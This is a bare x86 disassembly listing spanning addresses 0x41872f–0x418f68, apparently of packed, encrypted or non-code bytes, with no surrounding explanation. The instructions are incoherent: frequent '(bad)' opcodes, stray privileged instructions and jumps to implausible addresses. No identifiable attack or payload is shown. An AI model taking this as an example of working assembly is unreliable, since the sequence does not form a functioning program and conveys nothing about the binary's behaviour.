  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
